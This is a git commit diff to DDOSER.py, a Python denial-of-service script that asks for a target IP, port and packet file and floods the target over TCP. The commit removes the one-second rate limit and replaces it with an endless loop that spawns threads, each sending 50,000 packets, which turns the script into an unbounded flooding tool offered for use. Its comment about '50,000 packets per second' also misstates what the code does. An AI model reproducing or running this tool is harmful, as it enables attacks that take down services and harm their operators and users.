9d315b6589580bfcd8b2aea64635effac1010652
Liptoid <164546655+Liptoid@users.noreply.github.com>
2024-05-07 23:53:54 +0300

    Update DDOSER.py

--- DDOSER.py
+++ DDOSER.py
@@ -1,26 +1,27 @@
 import socket
-import time
+import threading
 
 def read_packet_from_file(file_name):
     with open(file_name, 'r') as file:
         return file.read()
 
-def send_packet(target_ip, target_port, packet, interval):
-    while True:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((target_ip, target_port))
+def send_packets(target_ip, target_port, packet, num_packets):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target_ip, target_port))
+        for _ in range(num_packets):
             s.send(packet.encode())
-            print("Packet sent to", target_ip, "on port", target_port)
-            s.close()
-        except Exception as e:
-            print("Error:", e)
-        time.sleep(interval)
+        print("Packets sent to", target_ip, "on port", target_port)
+        s.close()
+    except Exception as e:
+        print("Error:", e)
 
 if __name__ == "__main__":
     target_ip = input("Enter target IP address: ")
     target_port = int(input("Enter target port number: "))
     packet_file = input("Enter packet file name (e.g., pkg.txt): ")
     packet = read_packet_from_file(packet_file)
-    interval = 1 / 3  # 3 packets per second
-    send_packet(target_ip, target_port, packet, interval)
+    num_packets = 50000  # 50,000 packets per second
+
+    while True:
+        threading.Thread(target=send_packets, args=(target_ip, target_port, packet, num_packets)).start()
